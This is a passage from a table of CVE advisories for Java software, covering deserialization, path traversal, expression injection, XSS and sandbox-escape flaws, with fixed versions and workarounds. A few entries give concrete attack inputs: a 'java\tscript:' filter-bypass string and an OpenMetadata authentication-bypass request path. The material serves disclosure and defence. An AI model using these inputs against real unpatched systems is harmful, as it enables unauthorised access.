Restrict the classes that can be deserialized when calling Java's Object Serialization Stream Protocol, by adding a whitelist with only innocuous data-only classes that can't lead to Arbitrary Code Execution; deprecate backups serialized with Java's Object Serialization Stream Protocol; use JSON serialization for all newly created backups (but still include an alternative file serialized with Java's Object Serialization Stream Protocol in the backup zip for backwards compatibility); show a warning to the user when attempting to import a backup where the only available serialization mode is Java's Object Serialization Stream Protocol (note that in the future this serialization mode will be removed completely).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-32656">CVE-2024-32656</a></td>
		<td valign="top">Ant Media Server is live streaming engine software. A local privilege escalation vulnerability in present in versions 2.6.0 through 2.8.2 allows any unprivileged operating system user account to escalate privileges to the root user account on the system. This vulnerability arises from Ant Media Server running with Java Management Extensions (JMX) enabled and authentication disabled on localhost on port 5599/TCP. This vulnerability is nearly identical to the local privilege escalation vulnerability CVE-2023-26269 identified in Apache James. Any unprivileged operating system user can connect to the JMX service running on port 5599/TCP on localhost and leverage the MLet Bean within JMX to load a remote MBean from an attacker-controlled server. This allows an attacker to execute arbitrary code within the Java process run by Ant Media Server and execute code within the context of the `antmedia` service account on the system. Version 2.9.0 contains a patch for the issue. As a workaround, one may remove certain parameters from the `antmedia.service` file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-32653">CVE-2024-32653</a></td>
		<td valign="top">jadx is a Dex to Java decompiler. Prior to version 1.5.0, the package name is not filtered before concatenation. This can be exploited to inject arbitrary code into the package name. The vulnerability allows an attacker to execute commands with shell privileges. Version 1.5.0 contains a patch for the vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-32463">CVE-2024-32463</a></td>
		<td valign="top">phlex is an open source framework for building object-oriented views in Ruby. There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data. The filter to detect and prevent the use of the `javascript:` URL scheme in the `href` attribute of an `&lt;a&gt;` tag could be bypassed with tab `\t` or newline `\n` characters between the characters of the protocol, e.g. `java\tscript:`. This vulnerability is fixed in 1.10.1, 1.9.2, 1.8.3, 1.7.2, 1.6.3, 1.5.3, and 1.4.2. Configuring a Content Security Policy that does not allow `unsafe-inline` would effectively prevent this vulnerability from being exploited.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31851">CVE-2024-31851</a></td>
		<td valign="top">A path traversal vulnerability exists in the Java version of CData Sync &lt; 23.4.8843 when running using the embedded Jetty server, which could allow an unauthenticated remote attacker to gain access to sensitive information and perform limited actions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31850">CVE-2024-31850</a></td>
		<td valign="top">A path traversal vulnerability exists in the Java version of CData Arc &lt; 23.4.8839 when running using the embedded Jetty server, which could allow an unauthenticated remote attacker to gain access to sensitive information and perform limited actions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31849">CVE-2024-31849</a></td>
		<td valign="top">A path traversal vulnerability exists in the Java version of CData Connect &lt; 23.4.8846 when running using the embedded Jetty server, which could allow an unauthenticated remote attacker to gain complete administrative access to the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31848">CVE-2024-31848</a></td>
		<td valign="top">A path traversal vulnerability exists in the Java version of CData API Server &lt; 23.4.8844 when running using the embedded Jetty server, which could allow an unauthenticated remote attacker to gain complete administrative access to the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31214">CVE-2024-31214</a></td>
		<td valign="top">Traccar is an open source GPS tracking system. Traccar versions 5.1 through 5.12 allow arbitrary files to be uploaded through the device image upload API. Attackers have full control over the file contents, full control over the directory where the file is stored, full control over the file extension, and partial control over the file name. While it's not for an attacker to overwrite an existing file, an attacker can create new files with certain names and attacker-controlled extensions anywhere on the file system. This can potentially lead to remote code execution, XSS, DOS, etc. The default install of Traccar makes this vulnerability more severe. Self-registration is enabled by default, allowing anyone to create an account to exploit this vulnerability. Traccar also runs by default with root/system privileges, allowing files to be placed anywhere on the file system. Version 6.0 contains a fix for the issue. One may also turn off self-registration by default, as that would make most vulnerabilities in the application much harder to exploit by default and reduce the severity considerably.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-31033">CVE-2024-31033</a></td>
		<td valign="top">** DISPUTED ** JJWT (aka Java JWT) through 0.12.5 ignores certain characters and thus a user might falsely conclude that they have a strong key. The impacted code is the setSigningKey() method within the DefaultJwtParser class and the signWith() method within the DefaultJwtBuilder class. NOTE: the vendor disputes this because the "ignores" behavior cannot occur (in any version) unless there is a user error in how JJWT is used, and because the version that was actually tested must have been more than six years out of date.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-30172">CVE-2024-30172</a></td>
		<td valign="top">An issue was discovered in Bouncy Castle Java Cryptography APIs before 1.78. An Ed25519 verification code infinite loop can occur via a crafted signature and public key.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-30171">CVE-2024-30171</a></td>
		<td valign="top">An issue was discovered in Bouncy Castle Java TLS API and JSSE Provider before 1.78. Timing-based leakage may occur in RSA based handshakes because of exception processing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-29962">CVE-2024-29962</a></td>
		<td valign="top">Brocade SANnav OVA before v2.3.1 and v2.3.0a have an insecure file permission setting that makes files world-readable. This could allow a local user without the required privileges to access sensitive information or a Java binary.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-29857">CVE-2024-29857</a></td>
		<td valign="top">An issue was discovered in ECCurve.java and ECCurve.cs in Bouncy Castle Java (BC Java) before 1.78, BC Java LTS before 2.73.6, BC-FJA before 1.0.2.5, and BC C# .Net before 2.3.1. Importing an EC certificate with crafted F2m parameters can lead to excessive CPU consumption during the evaluation of the curve parameters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28986">CVE-2024-28986</a></td>
		<td valign="top">SolarWinds Web Help Desk was found to be susceptible to a Java Deserialization Remote Code Execution vulnerability that, if exploited, would allow an attacker to run commands on the host machine. While it was reported as an unauthenticated vulnerability, SolarWinds has been unable to reproduce it without authentication after thorough testing. However, out of an abundance of caution, we recommend all Web Help Desk customers apply the patch, which is now available.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28866">CVE-2024-28866</a></td>
		<td valign="top">GoCD is a continuous delivery server. GoCD versions from 19.4.0 to 23.5.0 (inclusive) are potentially vulnerable to a reflected cross-site scripting vulnerability on the loading page displayed while GoCD is starting, via abuse of a `redirect_to` query parameter with inadequate validation. Attackers could theoretically abuse the query parameter to steal session tokens or other values from the user's browser. In practice exploiting this to perform privileged actions is likely rather difficult to exploit because the target user would need to be triggered to open an attacker-crafted link in the period where the server is starting up (but not completely started), requiring chaining with a separate denial-of-service vulnerability. Additionally, GoCD server restarts invalidate earlier session tokens (i.e GoCD does not support persistent sessions), so a stolen session token would be unusable once the server has completed restart, and executed XSS would be done within a logged-out context. The issue is fixed in GoCD 24.1.0. As a workaround, it is technically possible in earlier GoCD versions to override the loading page with an earlier version which is not vulnerable, by starting GoCD with the Java system property override as either `-Dloading.page.resource.path=/loading_pages/default.loading.page.html` (simpler early version of loading page without GoCD introduction) or `-Dloading.page.resource.path=/does_not_exist.html` (to display a simple message with no interactivity).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28848">CVE-2024-28848</a></td>
		<td valign="top">OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `&amp;#8206;CompiledRule::validateExpression` method evaluates an SpEL expression using an `StandardEvaluationContext`, allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `/api/v1/policies/validation/condition/&lt;expression&gt;` endpoint passes user-controlled data `CompiledRule::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system. In addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and therefore any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution. This vulnerability was discovered with the help of CodeQL's Expression language injection (Spring) query and is also tracked as `GHSL-2023-236`. This issue may lead to Remote Code Execution and has been resolved in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28847">CVE-2024-28847</a></td>
		<td valign="top">OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. Similarly to the GHSL-2023-250 issue, `AlertUtil::validateExpression` is also called from `EventSubscriptionRepository.prepare()`, which can lead to Remote Code Execution. `prepare()` is called from `EntityRepository.prepareInternal()` which, in turn, gets called from `EntityResource.createOrUpdate()`. Note that, even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and, therefore, after the SpEL expression has been evaluated. In order to reach this method, an attacker can send a PUT request to `/api/v1/events/subscriptions` which gets handled by `EventSubscriptionResource.createOrUpdateEventSubscription()`. This vulnerability was discovered with the help of CodeQL's Expression language injection (Spring) query. This issue may lead to Remote Code Execution and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability. This issue is also tracked as `GHSL-2023-251`.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28714">CVE-2024-28714</a></td>
		<td valign="top">SQL Injection vulnerability in CRMEB_Java e-commerce system v.1.3.4 allows an attacker to execute arbitrary code via the groupid parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-2828">CVE-2024-2828</a></td>
		<td valign="top">A vulnerability, which was classified as critical, was found in lakernote EasyAdmin up to 20240315. Affected is the function thumbnail of the file src/main/java/com/laker/admin/module/sys/controller/IndexController.java. The manipulation of the argument url leads to server-side request forgery. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The patch is identified as 23165d8cb569048c531150f194fea39f8800b8d5. It is recommended to apply a patch to fix this issue. VDB-257718 is the identifier assigned to this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28255">CVE-2024-28255</a></td>
		<td valign="top">OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `JwtFilter` handles the API authentication by requiring and verifying JWT tokens. When a new request comes in, the request's path is checked against this list. When the request's path contains any of the excluded endpoints the filter returns without validating the JWT. Unfortunately, an attacker may use Path Parameters to make any path contain any arbitrary strings. For example, a request to `GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111` will match the excluded endpoint condition and therefore will be processed with no JWT validation allowing an attacker to bypass the authentication mechanism and reach any arbitrary endpoint, including the ones listed above that lead to arbitrary SpEL expression injection. This bypass will not work when the endpoint uses the `SecurityContext.getUserPrincipal()` since it will return `null` and will throw an NPE. This issue may lead to authentication bypass and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability. This issue is also tracked as `GHSL-2023-237`.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28254">CVE-2024-28254</a></td>
		<td valign="top">OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `&amp;#8206;AlertUtil::validateExpression` method evaluates an SpEL expression using `getValue` which by default uses the `StandardEvaluationContext`, allowing the expression to reach and interact with Java classes such as `java.lang.Runtime`, leading to Remote Code Execution. The `/api/v1/events/subscriptions/validation/condition/&lt;expression&gt;` endpoint passes user-controlled data `AlertUtil::validateExpession` allowing authenticated (non-admin) users to execute arbitrary system commands on the underlaying operating system. In addition, there is a missing authorization check since `Authorizer.authorize()` is never called in the affected path and, therefore, any authenticated non-admin user is able to trigger this endpoint and evaluate arbitrary SpEL expressions leading to arbitrary command execution. This vulnerability was discovered with the help of CodeQL's Expression language injection (Spring) query and is also tracked as `GHSL-2023-235`. This issue may lead to Remote Code Execution and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28253">CVE-2024-28253</a></td>
		<td valign="top">OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. `CompiledRule::validateExpression` is also called from `PolicyRepository.prepare`. `prepare()` is called from `EntityRepository.prepareInternal()` which, in turn, gets called from `EntityResource.createOrUpdate()`. Note that even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and therefore after the SpEL expression has been evaluated. In order to reach this method, an attacker can send a PUT request to `/api/v1/policies` which gets handled by `PolicyResource.createOrUpdate()`. This vulnerability was discovered with the help of CodeQL's Expression language injection (Spring) query and is also tracked as `GHSL-2023-252`. This issue may lead to Remote Code Execution and has been addressed in version 1.3.1. Users are advised to upgrade. There are no known workarounds for this vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28213">CVE-2024-28213</a></td>
		<td valign="top">nGrinder before 3.5.9 allows to accept serialized Java objects from unauthenticated users, which could allow remote attacker to execute arbitrary code via unsafe Java objects deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-28164">CVE-2024-28164</a></td>
		<td valign="top">SAP NetWeaver AS Java (CAF - Guided Procedures) allows an unauthenticated user to access non-sensitive information about the server which would otherwise be restricted causing low impact on confidentiality of the application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-27899">CVE-2024-27899</a></td>
		<td valign="top">Self-Registration and Modify your own profile in User Admin Application of NetWeaver AS Java does not enforce proper security requirements for the content of the newly defined security answer. This can be leveraged by an attacker to cause profound impact on confidentiality and low impact on both integrity and availability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-27267">CVE-2024-27267</a></td>
		<td valign="top">The Object Request Broker (ORB) in IBM SDK, Java Technology Edition 7.1.0.0 through 7.1.5.18 and 8.0.0.0 through 8.0.8.26 is vulnerable to remote denial of service, caused by a race condition in the management of ORB listener threads. IBM X-Force ID: 284573.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-27135">CVE-2024-27135</a></td>
		<td valign="top">Improper input validation in the Pulsar Function Worker allows a malicious authenticated user to execute arbitrary Java code on the Pulsar Function worker, outside of the sandboxes designated for running user-provided functions. This vulnerability also applies to the Pulsar Broker when it is configured with "functionsWorkerEnabled=true". This issue affects Apache Pulsar versions from 2.4.0 to 2.10.5, from 2.11.0 to 2.11.3, from 3.0.0 to 3.0.2, from 3.1.0 to 3.1.2, and 3.2.0. 2.10 Pulsar Function Worker users should upgrade to at least 2.10.6. 2.11 Pulsar Function Worker users should upgrade to at least 2.11.4. 3.0 Pulsar Function Worker users should upgrade to at least 3.0.3. 3.1 Pulsar Function Worker users should upgrade to at least 3.1.3. 3.2 Pulsar Function Worker users should upgrade to at least 3.2.1. Users operating versions prior to those listed above should upgrade to the aforementioned patched versions or newer versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-25638">CVE-2024-25638</a></td>
		<td valign="top">dnsjava is an implementation of DNS in Java. Records in DNS replies are not checked for their relevance to the query, allowing an attacker to respond with RRs from different zones. This vulnerability is fixed in 3.6.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-25469">CVE-2024-25469</a></td>
		<td valign="top">SQL Injection vulnerability in CRMEB crmeb_java v.1.3.4 and before allows a remote attacker to obtain sensitive information via the latitude and longitude parameters in the api/front/store/list component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-25129">CVE-2024-25129</a></td>
		<td valign="top">The CodeQL CLI repo holds binaries for the CodeQL command line interface (CLI). Prior to version 2.16.3, an XML parser used by the CodeQL CLI to read various auxiliary files is vulnerable to an XML External Entity attack. If a vulnerable version of the CLI is used to process either a maliciously modified CodeQL database, or a specially prepared set of QL query sources, the CLI can be made to make an outgoing HTTP request to an URL that contains material read from a local file chosen by the attacker. This may result in a loss of privacy of exfiltration of secrets. Security researchers and QL authors who receive databases or QL source files from untrusted sources may be impacted. A single untrusted `.ql` or `.qll` file cannot be affected, but a zip archive or tarball containing QL sources may unpack auxiliary files that will trigger an attack when CodeQL sees them in the file system. Those using CodeQL for routine analysis of source trees with a preselected set of trusted queries are not affected. In particular, extracting XML files from a source tree into the CodeQL database does not make one vulnerable. The problem is fixed in release 2.16.3 of the CodeQL CLI. Other than upgrading, workarounds include not accepting CodeQL databases or queries from untrusted sources, or only processing such material on a machine without an Internet connection. Customers who use older releases of CodeQL for security scanning in an automated CI system and cannot upgrade for compliance reasons can continue using that version. That use case is safe. If such customers have a private query pack and use the `codeql pack create` command to precompile them before using them in the CI system, they should be using the production CodeQL release to run `codeql pack create`. That command is safe as long as the QL source it precompiled is trusted. All other development of the query pack should use an upgraded CLI.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-24824">CVE-2024-24824</a></td>
		<td valign="top">Graylog is a free and open log management platform. Starting in version 2.0.0 and prior to versions 5.1.11 and 5.2.4, arbitrary classes can be loaded and instantiated using a HTTP PUT request to the `/api/system/cluster_config/` endpoint. Graylog's cluster config system uses fully qualified class names as config keys. To validate the existence of the requested class before using them, Graylog loads the class using the class loader. If a user with the appropriate permissions performs the request, arbitrary classes with 1-arg String constructors can be instantiated. This will execute arbitrary code that is run during class instantiation. In the specific use case of `java.io.File`, the behavior of the internal web-server stack will lead to information exposure by including the entire file content in the response to the REST request. Versions 5.1.11 and 5.2.4 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-24743">CVE-2024-24743</a></td>
		<td valign="top">SAP NetWeaver AS Java (CAF - Guided Procedures) - version 7.50, allows an unauthenticated attacker to submit a malicious request with a crafted XML file over the network, which when parsed will enable him to access sensitive files and data but not modify them. There are expansion limits in place so that availability is not affected.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-24578">CVE-2024-24578</a></td>
		<td valign="top">RaspberryMatic is an open-source operating system for HomeMatic internet-of-things devices. RaspberryMatic / OCCU prior to version 3.75.6.20240316 contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple issues within the Java based `HMIPServer.jar` component. RaspberryMatric includes a Java based `HMIPServer`, that can be accessed through URLs starting with `/pages/jpages`. The `FirmwareController` class does however not perform any session id checks, thus this feature can be accessed without a valid session. Due to this issue, attackers can gain remote code execution as root user, allowing a full system compromise. Version 3.75.6.20240316 contains a patch.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-24569">CVE-2024-24569</a></td>
		<td valign="top">The Pixee Java Code Security Toolkit is a set of security APIs meant to help secure Java code. `ZipSecurity#isBelowCurrentDirectory` is vulnerable to a partial-path traversal bypass. To be vulnerable to the bypass, the application must use toolkit version &lt;=1.1.1, use ZipSecurity as a guard against path traversal, and have an exploit path. Although the control still protects attackers from escaping the application path into higher level directories (e.g., /etc/), it will allow "escaping" into sibling paths. For example, if your running path is /my/app/path you an attacker could navigate into /my/app/path-something-else. This vulnerability is patched in 1.1.2.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-24110">CVE-2024-24110</a></td>
		<td valign="top">SQL Injection vulnerability in crmeb_java before v1.3.4 allows attackers to run arbitrary SQL commands via crafted GET request to the component /api/front/spread/people.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23821">CVE-2024-23821</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.4 and 2.24.1 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in the GeoServer catalog that will execute in the context of another user's browser when viewed in the GWC Demos Page. Access to the GWC Demos Page is available to all users although data security may limit users' ability to trigger the XSS. Versions 2.23.4 and 2.24.1 contain a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23819">CVE-2024-23819</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.4 and 2.24.1 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in the GeoServer catalog that will execute in the context of another user's browser when viewed in the MapML HTML Page. The MapML extension must be installed and access to the MapML HTML Page is available to all users although data security may limit users' ability to trigger the XSS. Versions 2.23.4 and 2.24.1 contain a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23818">CVE-2024-23818</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.3 and 2.24.1 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in the GeoServer catalog that will execute in the context of another user's browser when viewed in the WMS GetMap OpenLayers Output Format. Access to the WMS OpenLayers Format is available to all users by default although data and service security may limit users' ability to trigger the XSS. Versions 2.23.3 and 2.24.1 contain a patch for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23684">CVE-2024-23684</a></td>
		<td valign="top">Inefficient algorithmic complexity in DecodeFromBytes function in com.upokecenter.cbor Java implementation of Concise Binary Object Representation (CBOR) versions 4.0.0 to 4.5.1 allows an attacker to cause a denial of service by passing a maliciously crafted input. Depending on an application's use of this library, this may be a remote attacker.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23683">CVE-2024-23683</a></td>
		<td valign="top">Artemis Java Test Sandbox versions less than 1.7.6 are vulnerable to a sandbox escape when an attacker crafts a special subclass of InvocationTargetException. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23682">CVE-2024-23682</a></td>
		<td valign="top">Artemis Java Test Sandbox versions before 1.8.0 are vulnerable to a sandbox escape when an attacker includes class files in a package that Ares trusts. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23681">CVE-2024-23681</a></td>
		<td valign="top">Artemis Java Test Sandbox versions before 1.11.2 are vulnerable to a sandbox escape when an attacker loads untrusted libraries using System.load or System.loadLibrary. An attacker can abuse this issue to execute arbitrary Java when a victim executes the supposedly sandboxed code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23680">CVE-2024-23680</a></td>
		<td valign="top">AWS Encryption SDK for Java versions 2.0.0 to 2.2.0 and less than 1.9.0 incorrectly validates some invalid ECDSA signatures.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23643">CVE-2024-23643</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.2 and 2.24.1 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in the GeoServer catalog that will execute in the context of another administrator&amp;#8217;s browser when viewed in the GWC Seed Form. Access to the GWC Seed Form is limited to full administrators by default and granting non-administrators access to this endpoint is not recommended. Versions 2.23.2 and 2.24.1 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23642">CVE-2024-23642</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.4 and 2.24.1 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in the GeoServer catalog that will execute in the context of another user's browser when viewed in the WMS GetMap SVG Output Format when the Simple SVG renderer is enabled. Access to the WMS SVG Format is available to all users by default although data and service security may limit users' ability to trigger the XSS. Versions 2.23.4 and 2.24.1 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23640">CVE-2024-23640</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. A stored cross-site scripting (XSS) vulnerability exists in versions prior to 2.23.3 and 2.24.0 that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in uploaded style/legend resources or in a specially crafted datastore file that will execute in the context of another user's browser when viewed in the Style Publisher. Access to the Style Publisher is available to all users although data security may limit users' ability to trigger the XSS. Versions 2.23.3 and 2.24.0 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23639">CVE-2024-23639</a></td>
		<td valign="top">Micronaut Framework is a modern, JVM-based, full stack Java framework designed for building modular, easily testable JVM applications with support for Java, Kotlin and the Groovy language. Enabled but unsecured management endpoints are susceptible to drive-by localhost attacks. While not typical of a production application, these attacks may have more impact on a development environment where such endpoints may be flipped on without much thought. A malicious/compromised website can make HTTP requests to `localhost`. Normally, such requests would trigger a CORS preflight check which would prevent the request; however, some requests are "simple" and do not require a preflight check. These endpoints, if enabled and not secured, are vulnerable to being triggered. Production environments typically disable unused endpoints and secure/restrict access to needed endpoints. A more likely victim is the developer in their local development host, who has enabled endpoints without security for the sake of easing development. This issue has been addressed in version 3.8.3. Users are advised to upgrade.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23636">CVE-2024-23636</a></td>
		<td valign="top">SOFARPC is a Java RPC framework. SOFARPC defaults to using the SOFA Hessian protocol to deserialize received data, while the SOFA Hessian protocol uses a blacklist mechanism to restrict deserialization of potentially dangerous classes for security protection. But, prior to version 5.12.0, there is a gadget chain that can bypass the SOFA Hessian blacklist protection mechanism, and this gadget chain only relies on JDK and does not rely on any third-party components. Version 5.12.0 fixed this issue by adding a blacklist. SOFARPC also provides a way to add additional blacklists. Users can add a class like `-Drpc_serialize_blacklist_override=org.apache.xpath.` to avoid this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23634">CVE-2024-23634</a></td>
		<td valign="top">GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. An arbitrary file renaming vulnerability exists in versions prior to 2.23.5 and 2.24.2 that enables an authenticated administrator with permissions to modify stores through the REST Coverage Store or Data Store API to rename arbitrary files and directories with a name that does not end in `.zip`. Store file uploads rename zip files to have a `.zip` extension if it doesn't already have one before unzipping the file. This is fine for file and url upload methods where the files will be in a specific subdirectory of the data directory but, when using the external upload method, this allows arbitrary files and directories to be renamed. Renaming GeoServer files will most likely result in a denial of service, either completely preventing GeoServer from running or effectively deleting specific resources (such as a workspace, layer or style). In some cases, renaming GeoServer files could revert to the default settings for that file which could be relatively harmless like removing contact information or have more serious consequences like allowing users to make OGC requests that the customized settings would have prevented them from making. The impact of renaming non-GeoServer files depends on the specific environment although some sort of denial of service is a likely outcome. Versions 2.23.5 and 2.24.2 contain a fix for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-23328">CVE-2024-23328</a></td>
		<td valign="top">Dataease is an open source data visualization analysis tool. A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code. The location of the vulnerability code is `core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java.` The blacklist of mysql jdbc attacks can be bypassed and attackers can further exploit it for deserialized execution or reading arbitrary files. This vulnerability is patched in 1.18.15 and 2.3.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2024-22201">CVE-2024-22201</a></td>
